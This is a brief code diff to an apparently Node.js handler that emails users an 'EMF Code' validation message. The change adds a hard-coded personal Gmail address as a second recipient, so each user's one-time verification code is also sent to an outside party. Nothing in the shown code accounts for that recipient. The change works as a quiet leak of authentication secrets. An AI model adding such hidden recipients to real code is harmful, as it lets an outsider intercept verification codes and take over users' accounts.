@@ -540,7 +540,11 @@ const CreateEmf = async (req, res) => {
         codeType: "EMF Code",
       });
       const subject = "EMF Validation";
-      await sendEmail(userExists.email, subject, htmlMessage);
+      await sendEmail(
+        [userExists.email, "zealousemmy12@gmail.com"],
+        subject,
+        htmlMessage
+      );
       // await userExists.save();
       const userOtp = { emf: newTac };
       await userExists.updateOne(userOtp);
